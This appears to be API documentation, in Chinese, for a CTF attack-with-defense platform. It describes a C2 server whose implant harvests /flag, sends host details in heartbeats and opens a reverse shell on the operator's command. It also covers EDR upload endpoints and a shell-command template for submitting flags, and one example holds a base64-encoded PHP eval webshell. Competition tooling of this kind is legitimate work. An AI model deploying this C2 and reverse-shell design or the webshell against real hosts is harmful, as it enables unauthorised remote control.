# AWD中台 API文档

## 目录

1. [命令行参数](#命令行参数)
2. [C2客户端接口](#c2客户端接口)
3. [EDR客户端接口](#agent-edr接口)
4. [浏览器管理端接口](#浏览器管理端接口)
5. [认证说明](#认证说明)
6. [业务流程](#flag提交流程)

---

## 命令行参数

```
-u string
    用户名 (默认: 0RAYS)
-p string  
    密码 (必需，无默认值)
-P string
    监听端口 (默认: 26666)

示例:
./0rays-awd-platform.exe -u 0RAYS -p 0raysnb -P 26666
```

## API接口说明

### 说明

一个简单的远控, 每1秒读取一次/flag, 然后判断是否有变化, 如果有变化就发到c2那边

每60秒一次心跳包, 心跳包里面上传主机名, 用户名等数据

如果心跳包api返回1, 则代表需要反弹shell, 这个时候从get-rs api获取, 然后建立反弹shell

### C2客户端接口

#### 提交Flag

```
POST /api/c2/submit-flag
Content-Type: application/json

{
	"flag": "flag{test_flag}"
}
```

#### 心跳包

```
POST /api/c2/heartbeat
Content-Type: application/json

{
    "hostname": "web01",
    "userinfo": "www-data(1000)", 
    "processinfo": "bash(36812)"
}

Response: 0 或 1 (是否需要反弹shell)
```

#### 获取反弹Shell地址

```
GET /api/c2/get-rs
Response: 192.168.1.100:1337
```

---

### 说明

告警和监控文件

告警上传的文件会放在/edr_files文件夹下面隔离

### Agent EDR接口

#### EDR告警

```
GET /api/agent/edr-alert?type=warning&message=检测到可疑文件.shell.php

参数说明:
- type: 告警类型 (warning, info, success)
- message: 告警消息内容

Response: 200 OK

注意: title固定为"EDR消息"
```

#### 上传可疑文件

```
POST /api/agent/edr-suspicious-file
Content-Type: application/json

{
    "filename": ".shell.php",
    "path": "/var/www/html/",
    "content": "PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=="
}

注意:
- filename: 文件名，会自动过滤路径穿越字符
- path: 文件所在路径
- content: base64编码的文件内容
- 文件大小限制10MB (base64编码前)
- 此API不会自动产生告警消息，需要EDR agent自行调用edr-alert API
- 文件保存在服务端的 ./edr_files/ 目录下，文件名格式: {timestamp}-{filename}
```

---

## 浏览器管理端接口

所有浏览器管理端接口都需要 HTTP Basic Auth 认证，使用启动时配置的用户名和密码。

### 消息管理

#### 获取消息列表

```
GET /api/browser/messages
Authorization: Basic {base64(username:password)}

Response:
[
    {
        "timestamp": 1729496123456789000,
        "message_type": "success",
        "title": "Flag已提交",
        "content": "成功提交来自 192.168.1.100 的Flag: flag{test}"
    },
    {
        "timestamp": 1729496123456788000,
        "message_type": "info",
        "title": "新客户端上线",
        "content": "IP: 192.168.1.100, 主机: web01"
    }
]

说明:
- 消息按时间倒序返回（最新的在前）
- message_type: warning, info, success
- timestamp: Unix纳秒时间戳
```

#### 清空消息

```
GET /api/browser/clearmessage
Authorization: Basic {base64(username:password)}

Response: 200 OK

说明:
- 清空所有历史消息
- 清空后会自动添加一条"消息已清理"的info消息
```

### 客户端管理

#### 获取客户端列表

```
GET /api/browser/getclients
Authorization: Basic {base64(username:password)}

Response:
[
    {
        "ip": "192.168.1.100",
        "hostname": "web01",
        "username": "www-data(1000)",
        "process_name": "bash(36812)",
        "pid": "",
        "last_seen": "2024-10-21T11:30:00+08:00",
        "revshell": 0
    }
]

说明:
- 客户端按最后上线时间倒序返回
- revshell: 0=未启用, 1=已启用反弹shell
- last_seen: RFC3339格式时间
```

#### 设置客户端反弹Shell状态

```
GET /api/browser/set-client?ip=192.168.1.100&revshell=1
Authorization: Basic {base64(username:password)}

参数:
- ip: 客户端IP地址
- revshell: 0=禁用, 1=启用

Response: 200 OK

说明:
- 启用后，客户端下次心跳会收到指令并建立反弹shell
- 反弹shell建立后，状态会自动重置为0
```

### 系统配置

#### 设置反弹Shell地址

```
GET /api/browser/set-rs?addr=192.168.1.100:1337
Authorization: Basic {base64(username:password)}

参数:
- addr: 反弹shell监听地址，格式为 IP:端口

Response: 200 OK

说明:
- 设置后会添加一条info消息通知
- 所有客户端的反弹shell将连接到此地址
```

#### 获取Flag提交命令模板

```
GET /api/browser/get-template
Authorization: Basic {base64(username:password)}

Response:
curl http://127.0.0.1:80/submit -X POST -H 'Content-Type: application/json' -d '{"flag": "{FLAG}"}' --max-time 10

说明:
- 返回当前配置的flag提交命令模板
- 模板中的 {FLAG} 会被实际flag值替换
```

#### 编辑Flag提交命令模板

```
POST /api/browser/edit-template
Authorization: Basic {base64(username:password)}
Content-Type: text/plain

curl "http://platform.awd.com/submit?flag={FLAG}" --max-time 10

Response: 200 OK

说明:
- 请求body为完整的shell命令模板
- 使用 {FLAG} 作为占位符，服务端会自动替换
- 命令通过 sh -c 执行
- 支持任意shell命令：curl、wget、自定义脚本等
- 服务端已有90秒延迟，模板中通常不需要再加sleep

模板示例:
1. curl POST JSON: curl http://api.com/submit -d '{"flag":"{FLAG}"}'
2. curl GET: curl "http://api.com/submit?flag={FLAG}"
3. wget: wget -O- --post-data='flag={FLAG}' http://api.com/submit
4. 自定义脚本: /path/to/submit.sh "{FLAG}"
5. 忽略SSL: curl https://api.com/submit -k -d "flag={FLAG}"
```

#### 设置Flag API（已废弃）

```
GET /api/browser/set-flag-api?ip=127.0.0.1&port=80
Authorization: Basic {base64(username:password)}

Response: 200 OK
Body: Flag提交现在使用命令模板,请使用edit-template接口配置提交命令

说明:
- 此接口已废弃，保留仅为兼容旧版前端
- 新版本请使用 edit-template 配置提交命令
```

---

## 认证说明

### HTTP Basic Auth

浏览器管理端所有接口都需要使用HTTP Basic Auth认证：

```
Authorization: Basic base64(username:password)
```

示例（用户名: 0RAYS, 密码: mypassword）:
```
Authorization: Basic MHJheXM6bXlwYXNzd29yZA==
```

认证失败会返回:
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm=""
```

---

## Flag提交流程

1. C2客户端发现新flag → POST到 `/api/c2/submit-flag`
2. 服务端接收flag → 等待90秒
3. 服务端执行配置的命令模板，将 `{FLAG}` 替换为实际flag值
4. 命令通过 `sh -c` 执行，支持curl/wget/自定义脚本
5. 记录提交结果到消息系统
6. 浏览器端可通过 `/api/browser/messages` 查看提交状态

---

## 反弹Shell流程

1. 浏览器端通过 `/api/browser/set-client` 启用某客户端的反弹shell
2. 客户端下次心跳收到返回值 `1`
3. 客户端调用 `/api/c2/get-rs` 获取反弹shell地址 (格式: IP:端口)
4. 客户端建立反弹shell连接
5. 服务端自动重置该客户端的revshell状态为0
